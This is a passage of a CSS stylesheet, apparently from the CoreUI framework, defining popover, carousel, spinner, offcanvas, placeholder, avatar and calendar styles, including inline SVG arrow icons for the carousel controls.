                border-bottom: var(--cui-popover-border-width) solid var(--cui-popover-border-color);
                border-top-left-radius: var(--cui-popover-inner-border-radius);
                border-top-right-radius: var(--cui-popover-inner-border-radius);
            }
            .popover-header:empty {
                display: none;
            }
            .popover-body {
                padding: var(--cui-popover-body-padding-y) var(--cui-popover-body-padding-x);
                color: var(--cui-popover-body-color);
            }
            .carousel {
                position: relative;
            }
            .carousel.pointer-event {
                touch-action: pan-y;
            }
            .carousel-inner {
                position: relative;
                width: 100%;
                overflow: hidden;
            }
            .carousel-inner::after {
                display: block;
                clear: both;
                content: "";
            }
            .carousel-item {
                position: relative;
                display: none;
                float: left;
                width: 100%;
                margin-right: -100%;
                -webkit-backface-visibility: hidden;
                backface-visibility: hidden;
                transition: transform 0.6s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .carousel-item {
                    transition: none;
                }
            }
            .carousel-item.active,
            .carousel-item-next,
            .carousel-item-prev {
                display: block;
            }
            .carousel-item-next:not(.carousel-item-start),
            .active.carousel-item-end {
                transform: translateX(100%);
            }
            .carousel-item-prev:not(.carousel-item-end),
            .active.carousel-item-start {
                transform: translateX(-100%);
            }
            .carousel-fade .carousel-item {
                opacity: 0;
                transition-property: opacity;
                transform: none;
            }
            .carousel-fade .carousel-item.active,
            .carousel-fade .carousel-item-next.carousel-item-start,
            .carousel-fade .carousel-item-prev.carousel-item-end {
                z-index: 1;
                opacity: 1;
            }
            .carousel-fade .active.carousel-item-start,
            .carousel-fade .active.carousel-item-end {
                z-index: 0;
                opacity: 0;
                transition: opacity 0s 0.6s;
            }
            @media (prefers-reduced-motion: reduce) {
                .carousel-fade .active.carousel-item-start,
                .carousel-fade .active.carousel-item-end {
                    transition: none;
                }
            }
            .carousel-control-prev,
            .carousel-control-next {
                position: absolute;
                top: 0;
                bottom: 0;
                z-index: 1;
                display: flex;
                align-items: center;
                justify-content: center;
                width: 15%;
                padding: 0;
                color: var(--cui-carousel-control-color, rgba(255, 255, 255, 0.87));
                text-align: center;
                background: 0 0;
                border: 0;
                opacity: 0.5;
                transition: opacity 0.15s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .carousel-control-prev,
                .carousel-control-next {
                    transition: none;
                }
            }
            .carousel-control-prev:hover,
            .carousel-control-prev:focus,
            .carousel-control-next:hover,
            .carousel-control-next:focus {
                color: var(--cui-carousel-control-color, rgba(255, 255, 255, 0.87));
                text-decoration: none;
                outline: 0;
                opacity: 0.9;
            }
            .carousel-control-prev {
                left: 0;
            }
            .carousel-control-next {
                right: 0;
            }
            .carousel-control-prev-icon,
            .carousel-control-next-icon {
                display: inline-block;
                width: 2rem;
                height: 2rem;
                background-repeat: no-repeat;
                background-position: 50%;
                background-size: 100% 100%;
            }
            .carousel-control-prev-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxNiAxNicgZmlsbD0ncmdiYSgyNTUsIDI1NSwgMjU1LCAwLjg3KSc+PHBhdGggZD0nTTExLjM1NCAxLjY0NmEuNS41IDAgMCAxIDAgLjcwOEw1LjcwNyA4bDUuNjQ3IDUuNjQ2YS41LjUgMCAwIDEtLjcwOC43MDhsLTYtNmEuNS41IDAgMCAxIDAtLjcwOGw2LTZhLjUuNSAwIDAgMSAuNzA4IDB6Jy8+PC9zdmc+);
            }
            .carousel-control-next-icon {
                background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAxNiAxNicgZmlsbD0ncmdiYSgyNTUsIDI1NSwgMjU1LCAwLjg3KSc+PHBhdGggZD0nTTQuNjQ2IDEuNjQ2YS41LjUgMCAwIDEgLjcwOCAwbDYgNmEuNS41IDAgMCAxIDAgLjcwOGwtNiA2YS41LjUgMCAwIDEtLjcwOC0uNzA4TDEwLjI5MyA4IDQuNjQ2IDIuMzU0YS41LjUgMCAwIDEgMC0uNzA4eicvPjwvc3ZnPg==);
            }
            .carousel-indicators {
                position: absolute;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 2;
                display: flex;
                justify-content: center;
                padding: 0;
                margin-right: 15%;
                margin-bottom: 1rem;
                margin-left: 15%;
                list-style: none;
            }
            .carousel-indicators [data-coreui-target] {
                box-sizing: content-box;
                flex: 0 1 auto;
                width: 30px;
                height: 3px;
                padding: 0;
                margin-right: 3px;
                margin-left: 3px;
                text-indent: -999px;
                cursor: pointer;
                background-color: var(--cui-carousel-indicator-active-bg, #fff);
                background-clip: padding-box;
                border: 0;
                border-top: 10px solid transparent;
                border-bottom: 10px solid transparent;
                opacity: 0.5;
                transition: opacity 0.6s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .carousel-indicators [data-coreui-target] {
                    transition: none;
                }
            }
            .carousel-indicators .active {
                opacity: 1;
            }
            .carousel-caption {
                position: absolute;
                right: 15%;
                bottom: 1.25rem;
                left: 15%;
                padding-top: 1.25rem;
                padding-bottom: 1.25rem;
                color: var(--cui-carousel-caption-color, rgba(255, 255, 255, 0.87));
                text-align: center;
            }
            .carousel-dark {
                --cui-carousel-indicator-active-bg: #000015;
                --cui-carousel-caption-color: rgba(44, 56, 74, 0.95);
            }
            .carousel-dark .carousel-control-prev-icon,
            .carousel-dark .carousel-control-next-icon {
                filter: invert(1) grayscale(100);
            }
            .carousel-dark .carousel-indicators [data-coreui-target] {
                background-color: #000015;
            }
            .carousel-dark .carousel-caption {
                color: rgba(44, 56, 74, 0.95);
            }
            .spinner-grow,
            .spinner-border {
                display: inline-block;
                width: var(--cui-spinner-width);
                height: var(--cui-spinner-height);
                vertical-align: var(--cui-spinner-vertical-align);
                border-radius: 50%;
                animation: var(--cui-spinner-animation-speed) linear infinite var(--cui-spinner-animation-name);
            }
            @keyframes spinner-border {
                to {
                    transform: rotate(360deg);
                }
            }
            .spinner-border {
                --cui-spinner-width: 2rem;
                --cui-spinner-height: 2rem;
                --cui-spinner-vertical-align: -0.125em;
                --cui-spinner-border-width: 0.25em;
                --cui-spinner-animation-speed: 0.75s;
                --cui-spinner-animation-name: spinner-border;
                border: var(--cui-spinner-border-width) solid currentcolor;
                border-right-color: transparent;
            }
            .spinner-border-sm {
                --cui-spinner-width: 1rem;
                --cui-spinner-height: 1rem;
                --cui-spinner-border-width: 0.2em;
            }
            @keyframes spinner-grow {
                0% {
                    transform: scale(0);
                }
                50% {
                    opacity: 1;
                    transform: none;
                }
            }
            .spinner-grow {
                --cui-spinner-width: 2rem;
                --cui-spinner-height: 2rem;
                --cui-spinner-vertical-align: -0.125em;
                --cui-spinner-animation-speed: 0.75s;
                --cui-spinner-animation-name: spinner-grow;
                background-color: currentcolor;
                opacity: 0;
            }
            .spinner-grow-sm {
                --cui-spinner-width: 1rem;
                --cui-spinner-height: 1rem;
            }
            @media (prefers-reduced-motion: reduce) {
                .spinner-border,
                .spinner-grow {
                    --cui-spinner-animation-speed: 1.5s;
                }
            }
            .offcanvas,
            .offcanvas-xxl,
            .offcanvas-xl,
            .offcanvas-lg,
            .offcanvas-md,
            .offcanvas-sm {
                --cui-offcanvas-zindex: 1045;
                --cui-offcanvas-width: 400px;
                --cui-offcanvas-height: 30vh;
                --cui-offcanvas-padding-x: 1rem;
                --cui-offcanvas-padding-y: 1rem;
                --cui-offcanvas-color: unset;
                --cui-offcanvas-bg: #fff;
                --cui-offcanvas-border-width: 1px;
                --cui-offcanvas-border-color: var(--cui-border-color-translucent);
                --cui-offcanvas-box-shadow: 0 0.125rem 0.25rem rgba(0, 0, 21, 0.075);
            }
            @media (max-width: 575.98px) {
                .offcanvas-sm {
                    position: fixed;
                    bottom: 0;
                    z-index: var(--cui-offcanvas-zindex);
                    display: flex;
                    flex-direction: column;
                    max-width: 100%;
                    color: var(--cui-offcanvas-color);
                    visibility: hidden;
                    background-color: var(--cui-offcanvas-bg);
                    background-clip: padding-box;
                    outline: 0;
                    transition: transform 0.3s ease-in-out;
                }
            }
            @media (max-width: 575.98px) and (prefers-reduced-motion: reduce) {
                .offcanvas-sm {
                    transition: none;
                }
            }
            @media (max-width: 575.98px) {
                .offcanvas-sm.offcanvas-start {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                }
                html:not([dir="rtl"]) .offcanvas-sm.offcanvas-start {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(-100%);
                }
                *[dir="rtl"] .offcanvas-sm.offcanvas-start {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(100%);
                }
                .offcanvas-sm.offcanvas-end {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                    transform: translateX(100%);
                }
                html:not([dir="rtl"]) .offcanvas-sm.offcanvas-end {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                *[dir="rtl"] .offcanvas-sm.offcanvas-end {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                .offcanvas-sm.offcanvas-top {
                    top: 0;
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(-100%);
                }
                .offcanvas-sm.offcanvas-bottom {
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(100%);
                }
                .offcanvas-sm.showing,
                .offcanvas-sm.show:not(.hiding) {
                    transform: none !important;
                }
                .offcanvas-sm.showing,
                .offcanvas-sm.hiding,
                .offcanvas-sm.show {
                    visibility: visible;
                }
            }
            @media (min-width: 576px) {
                .offcanvas-sm {
                    --cui-offcanvas-height: auto;
                    --cui-offcanvas-border-width: 0;
                    background-color: transparent !important;
                }
                .offcanvas-sm .offcanvas-header {
                    display: none;
                }
                .offcanvas-sm .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                    background-color: transparent !important;
                }
            }
            @media (max-width: 767.98px) {
                .offcanvas-md {
                    position: fixed;
                    bottom: 0;
                    z-index: var(--cui-offcanvas-zindex);
                    display: flex;
                    flex-direction: column;
                    max-width: 100%;
                    color: var(--cui-offcanvas-color);
                    visibility: hidden;
                    background-color: var(--cui-offcanvas-bg);
                    background-clip: padding-box;
                    outline: 0;
                    transition: transform 0.3s ease-in-out;
                }
            }
            @media (max-width: 767.98px) and (prefers-reduced-motion: reduce) {
                .offcanvas-md {
                    transition: none;
                }
            }
            @media (max-width: 767.98px) {
                .offcanvas-md.offcanvas-start {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                }
                html:not([dir="rtl"]) .offcanvas-md.offcanvas-start {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(-100%);
                }
                *[dir="rtl"] .offcanvas-md.offcanvas-start {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(100%);
                }
                .offcanvas-md.offcanvas-end {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                    transform: translateX(100%);
                }
                html:not([dir="rtl"]) .offcanvas-md.offcanvas-end {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                *[dir="rtl"] .offcanvas-md.offcanvas-end {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                .offcanvas-md.offcanvas-top {
                    top: 0;
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(-100%);
                }
                .offcanvas-md.offcanvas-bottom {
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(100%);
                }
                .offcanvas-md.showing,
                .offcanvas-md.show:not(.hiding) {
                    transform: none !important;
                }
                .offcanvas-md.showing,
                .offcanvas-md.hiding,
                .offcanvas-md.show {
                    visibility: visible;
                }
            }
            @media (min-width: 768px) {
                .offcanvas-md {
                    --cui-offcanvas-height: auto;
                    --cui-offcanvas-border-width: 0;
                    background-color: transparent !important;
                }
                .offcanvas-md .offcanvas-header {
                    display: none;
                }
                .offcanvas-md .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                    background-color: transparent !important;
                }
            }
            @media (max-width: 991.98px) {
                .offcanvas-lg {
                    position: fixed;
                    bottom: 0;
                    z-index: var(--cui-offcanvas-zindex);
                    display: flex;
                    flex-direction: column;
                    max-width: 100%;
                    color: var(--cui-offcanvas-color);
                    visibility: hidden;
                    background-color: var(--cui-offcanvas-bg);
                    background-clip: padding-box;
                    outline: 0;
                    transition: transform 0.3s ease-in-out;
                }
            }
            @media (max-width: 991.98px) and (prefers-reduced-motion: reduce) {
                .offcanvas-lg {
                    transition: none;
                }
            }
            @media (max-width: 991.98px) {
                .offcanvas-lg.offcanvas-start {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                }
                html:not([dir="rtl"]) .offcanvas-lg.offcanvas-start {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(-100%);
                }
                *[dir="rtl"] .offcanvas-lg.offcanvas-start {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(100%);
                }
                .offcanvas-lg.offcanvas-end {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                    transform: translateX(100%);
                }
                html:not([dir="rtl"]) .offcanvas-lg.offcanvas-end {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                *[dir="rtl"] .offcanvas-lg.offcanvas-end {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                .offcanvas-lg.offcanvas-top {
                    top: 0;
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(-100%);
                }
                .offcanvas-lg.offcanvas-bottom {
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(100%);
                }
                .offcanvas-lg.showing,
                .offcanvas-lg.show:not(.hiding) {
                    transform: none !important;
                }
                .offcanvas-lg.showing,
                .offcanvas-lg.hiding,
                .offcanvas-lg.show {
                    visibility: visible;
                }
            }
            @media (min-width: 992px) {
                .offcanvas-lg {
                    --cui-offcanvas-height: auto;
                    --cui-offcanvas-border-width: 0;
                    background-color: transparent !important;
                }
                .offcanvas-lg .offcanvas-header {
                    display: none;
                }
                .offcanvas-lg .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                    background-color: transparent !important;
                }
            }
            @media (max-width: 1199.98px) {
                .offcanvas-xl {
                    position: fixed;
                    bottom: 0;
                    z-index: var(--cui-offcanvas-zindex);
                    display: flex;
                    flex-direction: column;
                    max-width: 100%;
                    color: var(--cui-offcanvas-color);
                    visibility: hidden;
                    background-color: var(--cui-offcanvas-bg);
                    background-clip: padding-box;
                    outline: 0;
                    transition: transform 0.3s ease-in-out;
                }
            }
            @media (max-width: 1199.98px) and (prefers-reduced-motion: reduce) {
                .offcanvas-xl {
                    transition: none;
                }
            }
            @media (max-width: 1199.98px) {
                .offcanvas-xl.offcanvas-start {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                }
                html:not([dir="rtl"]) .offcanvas-xl.offcanvas-start {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(-100%);
                }
                *[dir="rtl"] .offcanvas-xl.offcanvas-start {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(100%);
                }
                .offcanvas-xl.offcanvas-end {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                    transform: translateX(100%);
                }
                html:not([dir="rtl"]) .offcanvas-xl.offcanvas-end {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                *[dir="rtl"] .offcanvas-xl.offcanvas-end {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                .offcanvas-xl.offcanvas-top {
                    top: 0;
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(-100%);
                }
                .offcanvas-xl.offcanvas-bottom {
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(100%);
                }
                .offcanvas-xl.showing,
                .offcanvas-xl.show:not(.hiding) {
                    transform: none !important;
                }
                .offcanvas-xl.showing,
                .offcanvas-xl.hiding,
                .offcanvas-xl.show {
                    visibility: visible;
                }
            }
            @media (min-width: 1200px) {
                .offcanvas-xl {
                    --cui-offcanvas-height: auto;
                    --cui-offcanvas-border-width: 0;
                    background-color: transparent !important;
                }
                .offcanvas-xl .offcanvas-header {
                    display: none;
                }
                .offcanvas-xl .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                    background-color: transparent !important;
                }
            }
            @media (max-width: 1399.98px) {
                .offcanvas-xxl {
                    position: fixed;
                    bottom: 0;
                    z-index: var(--cui-offcanvas-zindex);
                    display: flex;
                    flex-direction: column;
                    max-width: 100%;
                    color: var(--cui-offcanvas-color);
                    visibility: hidden;
                    background-color: var(--cui-offcanvas-bg);
                    background-clip: padding-box;
                    outline: 0;
                    transition: transform 0.3s ease-in-out;
                }
            }
            @media (max-width: 1399.98px) and (prefers-reduced-motion: reduce) {
                .offcanvas-xxl {
                    transition: none;
                }
            }
            @media (max-width: 1399.98px) {
                .offcanvas-xxl.offcanvas-start {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                }
                html:not([dir="rtl"]) .offcanvas-xxl.offcanvas-start {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(-100%);
                }
                *[dir="rtl"] .offcanvas-xxl.offcanvas-start {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateX(100%);
                }
                .offcanvas-xxl.offcanvas-end {
                    top: 0;
                    width: var(--cui-offcanvas-width);
                    transform: translateX(100%);
                }
                html:not([dir="rtl"]) .offcanvas-xxl.offcanvas-end {
                    right: 0;
                    border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                *[dir="rtl"] .offcanvas-xxl.offcanvas-end {
                    left: 0;
                    border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                }
                .offcanvas-xxl.offcanvas-top {
                    top: 0;
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(-100%);
                }
                .offcanvas-xxl.offcanvas-bottom {
                    right: 0;
                    left: 0;
                    height: var(--cui-offcanvas-height);
                    max-height: 100%;
                    border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                    transform: translateY(100%);
                }
                .offcanvas-xxl.showing,
                .offcanvas-xxl.show:not(.hiding) {
                    transform: none !important;
                }
                .offcanvas-xxl.showing,
                .offcanvas-xxl.hiding,
                .offcanvas-xxl.show {
                    visibility: visible;
                }
            }
            @media (min-width: 1400px) {
                .offcanvas-xxl {
                    --cui-offcanvas-height: auto;
                    --cui-offcanvas-border-width: 0;
                    background-color: transparent !important;
                }
                .offcanvas-xxl .offcanvas-header {
                    display: none;
                }
                .offcanvas-xxl .offcanvas-body {
                    display: flex;
                    flex-grow: 0;
                    padding: 0;
                    overflow-y: visible;
                    background-color: transparent !important;
                }
            }
            .offcanvas {
                position: fixed;
                bottom: 0;
                z-index: var(--cui-offcanvas-zindex);
                display: flex;
                flex-direction: column;
                max-width: 100%;
                color: var(--cui-offcanvas-color);
                visibility: hidden;
                background-color: var(--cui-offcanvas-bg);
                background-clip: padding-box;
                outline: 0;
                transition: transform 0.3s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .offcanvas {
                    transition: none;
                }
            }
            .offcanvas.offcanvas-start {
                top: 0;
                width: var(--cui-offcanvas-width);
            }
            html:not([dir="rtl"]) .offcanvas.offcanvas-start {
                left: 0;
                border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                transform: translateX(-100%);
            }
            *[dir="rtl"] .offcanvas.offcanvas-start {
                right: 0;
                border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                transform: translateX(100%);
            }
            .offcanvas.offcanvas-end {
                top: 0;
                width: var(--cui-offcanvas-width);
                transform: translateX(100%);
            }
            html:not([dir="rtl"]) .offcanvas.offcanvas-end {
                right: 0;
                border-left: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
            }
            *[dir="rtl"] .offcanvas.offcanvas-end {
                left: 0;
                border-right: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
            }
            .offcanvas.offcanvas-top {
                top: 0;
                right: 0;
                left: 0;
                height: var(--cui-offcanvas-height);
                max-height: 100%;
                border-bottom: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                transform: translateY(-100%);
            }
            .offcanvas.offcanvas-bottom {
                right: 0;
                left: 0;
                height: var(--cui-offcanvas-height);
                max-height: 100%;
                border-top: var(--cui-offcanvas-border-width) solid var(--cui-offcanvas-border-color);
                transform: translateY(100%);
            }
            .offcanvas.showing,
            .offcanvas.show:not(.hiding) {
                transform: none !important;
            }
            .offcanvas.showing,
            .offcanvas.hiding,
            .offcanvas.show {
                visibility: visible;
            }
            .offcanvas-backdrop {
                position: fixed;
                top: 0;
                left: 0;
                z-index: 1040;
                width: 100vw;
                height: 100vh;
                background-color: var(--cui-offcanvas-backdrop-bg, #000015);
            }
            .offcanvas-backdrop.fade {
                opacity: 0;
            }
            .offcanvas-backdrop.show {
                opacity: 0.5;
            }
            .offcanvas-header {
                display: flex;
                align-items: center;
                justify-content: space-between;
                padding: var(--cui-offcanvas-padding-y) var(--cui-offcanvas-padding-x);
            }
            .offcanvas-header .btn-close {
                padding: calc(var(--cui-offcanvas-padding-y) * 0.5) calc(var(--cui-offcanvas-padding-x) * 0.5);
                margin-top: calc(-0.5 * var(--cui-offcanvas-padding-y));
                margin-bottom: calc(-0.5 * var(--cui-offcanvas-padding-y));
            }
            html:not([dir="rtl"]) .offcanvas-header .btn-close {
                margin-right: calc(-0.5 * var(--cui-offcanvas-padding-x));
            }
            *[dir="rtl"] .offcanvas-header .btn-close {
                margin-left: calc(-0.5 * var(--cui-offcanvas-padding-x));
            }
            .offcanvas-title {
                margin-bottom: 0;
                line-height: 1.5;
            }
            .offcanvas-body {
                flex-grow: 1;
                padding: var(--cui-offcanvas-padding-y) var(--cui-offcanvas-padding-x);
                overflow-y: auto;
            }
            .placeholder {
                display: inline-block;
                min-height: 1em;
                vertical-align: middle;
                cursor: wait;
                background-color: currentcolor;
                opacity: 0.5;
            }
            .placeholder.btn::before {
                display: inline-block;
                content: "";
            }
            .placeholder-xs {
                min-height: 0.6em;
            }
            .placeholder-sm {
                min-height: 0.8em;
            }
            .placeholder-lg {
                min-height: 1.2em;
            }
            .placeholder-glow .placeholder {
                animation: placeholder-glow 2s ease-in-out infinite;
            }
            @keyframes placeholder-glow {
                50% {
                    opacity: 0.2;
                }
            }
            .placeholder-wave {
                -webkit-mask-image: linear-gradient(130deg, #000015 55%, rgba(0, 0, 0, 0.8) 75%, #000015 95%);
                mask-image: linear-gradient(130deg, #000015 55%, rgba(0, 0, 0, 0.8) 75%, #000015 95%);
                -webkit-mask-size: 200% 100%;
                mask-size: 200% 100%;
                animation: placeholder-wave 2s linear infinite;
            }
            @keyframes placeholder-wave {
                100% {
                    -webkit-mask-position: -200% 0%;
                    mask-position: -200% 0%;
                }
            }
            .avatar {
                position: relative;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                vertical-align: middle;
                border-radius: 50em;
                transition: margin 0.15s;
                width: 2rem;
                height: 2rem;
                font-size: 0.8rem;
            }
            @media (prefers-reduced-motion: reduce) {
                .avatar {
                    transition: none;
                }
            }
            .avatar .avatar-status {
                width: 0.5333333333rem;
                height: 0.5333333333rem;
            }
            .avatar-img {
                width: 100%;
                height: auto;
                border-radius: 50em;
            }
            .avatar-status {
                position: absolute;
                bottom: 0;
                display: block;
                border: 1px solid #fff;
                border-radius: 50em;
            }
            html:not([dir="rtl"]) .avatar-status {
                right: 0;
            }
            *[dir="rtl"] .avatar-status {
                left: 0;
            }
            .avatar-sm {
                width: 1.5rem;
                height: 1.5rem;
                font-size: 0.6rem;
            }
            .avatar-sm .avatar-status {
                width: 0.4rem;
                height: 0.4rem;
            }
            .avatar-md {
                width: 2.5rem;
                height: 2.5rem;
                font-size: 1rem;
            }
            .avatar-md .avatar-status {
                width: 0.6666666667rem;
                height: 0.6666666667rem;
            }
            .avatar-lg {
                width: 3rem;
                height: 3rem;
                font-size: 1.2rem;
            }
            .avatar-lg .avatar-status {
                width: 0.8rem;
                height: 0.8rem;
            }
            .avatar-xl {
                width: 4rem;
                height: 4rem;
                font-size: 1.6rem;
            }
            .avatar-xl .avatar-status {
                width: 1.0666666667rem;
                height: 1.0666666667rem;
            }
            .avatars-stack {
                display: flex;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar {
                margin-right: -0.8rem;
            }
            *[dir="rtl"] .avatars-stack .avatar {
                margin-left: -0.8rem;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar:hover {
                margin-right: 0;
            }
            *[dir="rtl"] .avatars-stack .avatar:hover {
                margin-left: 0;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar-sm {
                margin-right: -0.6rem;
            }
            *[dir="rtl"] .avatars-stack .avatar-sm {
                margin-left: -0.6rem;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar-md {
                margin-right: -1rem;
            }
            *[dir="rtl"] .avatars-stack .avatar-md {
                margin-left: -1rem;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar-lg {
                margin-right: -1.2rem;
            }
            *[dir="rtl"] .avatars-stack .avatar-lg {
                margin-left: -1.2rem;
            }
            html:not([dir="rtl"]) .avatars-stack .avatar-xl {
                margin-right: -1.6rem;
            }
            *[dir="rtl"] .avatars-stack .avatar-xl {
                margin-left: -1.6rem;
            }
            .calendar {
                --cui-calendar-table-margin: 0.5rem;
                --cui-calendar-table-cell-size: 2.75rem;
                --cui-calendar-nav-padding: 0.5rem;
                --cui-calendar-nav-border: 1px solid #d8dbe0;
                --cui-calendar-nav-date-color: rgba(44, 56, 74, 0.95);
                --cui-calendar-nav-date-hover-color: #321fdb;
                --cui-calendar-nav-icon-width: 1rem;
                --cui-calendar-nav-icon-height: 1rem;
                --cui-calendar-cell-header-inner-color: rgba(44, 56, 74, 0.681);
                --cui-calendar-cell-hover-bg: #d8dbe0;
                --cui-calendar-cell-disabled-color: rgba(44, 56, 74, 0.38);
                --cui-calendar-cell-selected-color: #fff;
                --cui-calendar-cell-selected-bg: #321fdb;
                --cui-calendar-cell-range-bg: rgba(50, 31, 219, 0.125);
                --cui-calendar-cell-range-hover-bg: rgba(50, 31, 219, 0.25);
                --cui-calendar-cell-range-hover-border-color: #321fdb;
                --cui-calendar-cell-today-color: #e55353;
                font-weight: initial;
            }
            .calendar table {
                width: calc(var(--cui-calendar-table-cell-size) * 7);
                margin: var(--cui-calendar-table-margin);
            }
            .calendar table th,
            .calendar table td {
                width: var(--cui-calendar-table-cell-size);
            }
            .calendar.months ~ .time-picker,
            .calendar.years ~ .time-picker {
                display: none;
            }
            .calendars {
                display: flex;
            }
            .calendar-nav {
                display: flex;
                align-items: baseline;
                padding: var(--cui-calendar-nav-padding);
                border-bottom: var(--cui-calendar-nav-border);
            }
            .calendar-nav-date {
                flex: 1;
                text-align: center;
            }
            .calendar-nav-date .btn {
                font-weight: 600;
                color: var(--cui-calendar-nav-date-color);
            }
            .calendar-nav-date .btn:hover {
                color: var(--cui-calendar-nav-date-hover-color);
            }
            .calendar-nav-icon {
                display: block;
                width: var(--cui-calendar-nav-icon-width);
                height: var(--cui-calendar-nav-icon-height);
                transition: background-image 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .calendar-nav-icon {
                    transition: none;
                }
            }
            html:not([dir="rtl"]) .calendar-nav-icon-double-next {
